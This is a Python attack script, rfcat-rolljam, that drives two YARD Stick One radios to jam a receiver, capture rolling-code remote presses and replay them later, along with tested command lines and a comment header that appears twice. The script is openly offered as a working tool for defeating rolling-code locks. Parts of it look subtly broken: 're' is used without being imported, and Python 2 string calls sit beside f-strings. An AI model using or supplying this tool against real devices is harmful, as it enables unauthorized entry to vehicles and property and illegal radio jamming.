#rfcat-rolljam is a python script to "jam", capture, and replay rolling code signals using two yard stick one devices and rfcat.
#
#The name rfcat-rolljam is inspired by Samy Kamkar's RollJam which is a device that defeats rolling code security.
#This is done by jamming the receiver, capturing two or more remote presses, then stopping the jammer and replaying the first remote press
#saving the next capture in the rolling code series to replay later. The python code for rfcat-rolljam combines two projects that are already
#publicly available on Github that allow you to perform a rolljam like attack, it was just fairly clunky to do so requiring multiple scripts,
#this script simply combines everything into a single script that automates the process. It is up to you to follow all of the laws in your area.
#Jamming a signal is not legal in many areas. The author(s) of this code take no responsibility for your use or misuse of the script. If you choose
#to actually use the code you should do so in a controlled environment and only on equipment that you own. Please follow all local, state, federal,
#and international, and religious laws.
#
#The below commands have been tested by an anonymous user to perform a rolljam attack on a remote power outlet
#Capture and replay first code automatically: python rfcat-rolljam.py -f 315060000 -r 1818 -m -40 -o -2500000 -O capture.io
#Capture and wait for keypress to replay first code: python rfcat-rolljam.py -f 315060000 -r 1818 -m -40 -o -2500000 -O capture.io -k
#Load previous captures to replay: python rfcat-rolljam.py -I capture.io
#
#The original rolljam was created by Samy Kamkar https://samy.pl
#Jammer portion of the code is borrowed from Alex's rolljam repo https://github.com/alextspy/rolljam
#Scan and replay of the code is borrowed from Andrew Macpherson's RfCatHelpers https://github.com/AndrewMohawk/RfCatHelpers
#Combined and lightly modified into something similar to Samy Kamkar's original rolljam by Corey Harding from https://LegacySecurityGroup.com

#rfcat-rolljam is a python script to "jam", capture, and replay rolling code signals using two yard stick one devices and rfcat.
#
#The name rfcat-rolljam is inspired by Samy Kamkar's RollJam which is a device that defeats rolling code security.
#This is done by jamming the receiver, capturing two or more remote presses, then stopping the jammer and replaying the first remote press
#saving the next capture in the rolling code series to replay later. The python code for rfcat-rolljam combines two projects that are already
#publicly available on Github that allow you to perform a rolljam like attack, it was just fairly clunky to do so requiring multiple scripts,
#this script simply combines everything into a single script that automates the process. It is up to you to follow all of the laws in your area.
#Jamming a signal is not legal in many areas. The author(s) of this code take no responsibility for your use or misuse of the script. If you choose
#to actually use the code you should do so in a controlled environment and only on equipment that you own. Please follow all local, state, federal,
#and international, and religious laws.
#
#The below commands have been tested by an anonymous user to perform a rolljam attack on a remote power outlet
#Capture and replay first code automatically: python rfcat-rolljam.py -f 315060000 -r 1818 -m -40 -o -2500000 -O capture.io
#Capture and wait for keypress to replay first code: python rfcat-rolljam.py -f 315060000 -r 1818 -m -40 -o -2500000 -O capture.io -k
#Load previous captures to replay: python rfcat-rolljam.py -I capture.io
#
#The original rolljam was created by Samy Kamkar https://samy.pl
#Jammer portion of the code is borrowed from Alex's rolljam repo https://github.com/alextspy/rolljam
#Scan and replay of the code is borrowed from Andrew Macpherson's RfCatHelpers https://github.com/AndrewMohawk/RfCatHelpers
#Combined and lightly modified into something similar to Samy Kamkar's original rolljam by Corey Harding from https://LegacySecurityGroup.com

#!/usr/bin/env python

import sys
import time
import pickle
import bitstring
import argparse
from struct import *
from operator import itemgetter
from rflib import *

# Function for setting RfCat parameters
def set_rfcat_params(rfcat_obj, modulation, freq, drate, chanBW, chanSpc, power, idx):
    rfcat_obj.setMdmModulation(modulation)
    rfcat_obj.setFreq(freq)
    rfcat_obj.setMdmDRate(drate)
    rfcat_obj.setMdmChanBW(chanBW)
    rfcat_obj.setMdmChanSpc(chanSpc)
    rfcat_obj.setChannel(idx)
    rfcat_obj.setPower(power)
    rfcat_obj.lowball(1)
    return rfcat_obj

def main():
    parser = argparse.ArgumentParser(description='Python port of Samy Kamkar\'s Rolljam.  Code by Andrew Macpherson, Ghostlulz(Alex), Corey Harding, and RocketGod.')
    parser.add_argument('-f', action="store", default="315060000", dest="baseFreq",help='Target frequency to listen for remote (default: 315060000)',type=int)
    parser.add_argument('-r', action="store", dest="baudRate",default=1818,help='Baudrate (default: 1818)',type=int)
    parser.add_argument('-n', action="store", dest="numSignals",default=2,help='Number of signals to capture before replaying (default: 2)',type=int)
    parser.add_argument('-i', action="store", default="24000", dest="chanWidth",help='Width of each channel (lowest being 24000 -- default)',type=int)
    parser.add_argument('-c', action="store", default="60000", dest="chanBW",help='Channel BW for RX (default: 60000)',type=int)
    parser.add_argument('-I', action="store", default="", dest="inFile",help='File to read in')
    parser.add_argument('-O', action="store", default="", dest="outFile",help='Output file to save captures to')
    parser.add_argument('-o', action="store", default="-70000", dest="offset",help='Frequency offset of jammer (default: -70000)')
    parser.add_argument('-p', action="store", default="200", dest="power",help='Power level for re-transmitting (default: 200)',type=int)
    parser.add_argument('-m', action="store", default="-40", dest="minRSSI",help='Minimum RSSI db to accept signal (default: -40)',type=int)
    parser.add_argument('-M', action="store", default="40", dest="maxRSSI",help='Maximum RSSI db to accept signal (default: 40)',type=int)
    parser.add_argument('-k', action="store_true", dest="waitForKeypress", default=False,help='Wait for keypress before resending first capture (default: False)')
    results = parser.parse_args()

    try:
        results = parser.parse_args()
    except Exception as e:
        print(f"Failed to parse arguments: {e}")
        sys.exit(1)

    rawCapture = []

    try:
        print(f"Configuring Scanner on Frequency: {results.baseFreq}")
        d = RfCat(idx=0)
        d = set_rfcat_params(d, MOD_ASK_OOK, results.baseFreq, results.baudRate, results.chanBW, results.chanWidth, results.power, 0)

        print(f"Configuring Jammer on Frequency: {int(results.baseFreq)+int(results.offset)}")
        c = RfCat(idx=1)
        c = set_rfcat_params(c, MOD_ASK_OOK, int(results.baseFreq)+int(results.offset), results.baudRate, results.chanBW, results.chanWidth, 0, 0)
    except Exception as e:
        print(f"Failed to configure RfCat: {e}")
        sys.exit(1)

    time.sleep(1)

    if(results.inFile != ''):
        try:
            with open(results.inFile, "rb") as file:
                rawCapture = pickle.load(file)
        except Exception as e:
            print(f"Failed to read input file: {e}")
            sys.exit(1)

        if len(rawCapture) == 0:
            print("No captures found")
            sys.exit()
        else:
            print(f"Loaded {len(rawCapture)} captures")

    try:
        print("Jamming....")
        c.setModeTX()
        print("Scanning...")

        while True:
            try:
                y, t = d.RFrecv(1)
                sampleString = y.encode('hex')
                strength = 0 - ord(str(d.getRSSI()))

                if (re.search(r'((0)\2{15,})', sampleString)):
                    print(f"Signal Strength: {strength}")
                    if(results.minRSSI < strength < results.maxRSSI):
                        rawCapture.append(sampleString)
                        print(f"Found {sampleString}")
                        if(len(rawCapture) >= results.numSignals):
                            break;
                
            except ChipconUsbTimeoutException:
                continue
            except KeyboardInterrupt:
                break

        print("Saving phase")
        outputCapture = rawCapture
        if(results.outFile != ''):
            try:
                with open(results.outFile, "wb") as file:
                    pickle.dump(outputCapture, file)
            except Exception as e:
                print(f"Failed to write to output file: {e}")
                sys.exit(1)

        print("Send Phase...")
        emptykey = '\x00\x00\x00\x00\x00\x00\x00'
        d.makePktFLEN(len(emptykey))
        d.RFxmit(emptykey)

        print('Done jamming')

        if(results.waitForKeypress):
            time.sleep(.5)
            c.setModeIDLE() 

        if(results.waitForKeypress):
            input(" Press enter to send first capture")

        print('Replaying')

        for i in range(len(rawCapture)):
            try:
                key_packed = bitstring.BitArray(hex=rawCapture[i]).tobytes()
                input(f" Press enter to send capture {i+1} of {len(rawCapture)}")
                d.makePktFLEN(len(key_packed))
                d.RFxmit(key_packed)
                print(f"Sent capture {i+1} of {len(rawCapture)}")

            except KeyboardInterrupt:
                print("Bye!")
                d.setModeIDLE()
                c.setModeIDLE() 
                sys.exit()

        print("exiting.")
        d.setModeIDLE()
        c.setModeIDLE()

    except Exception as e:
        print(f"Unexpected error occurred: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()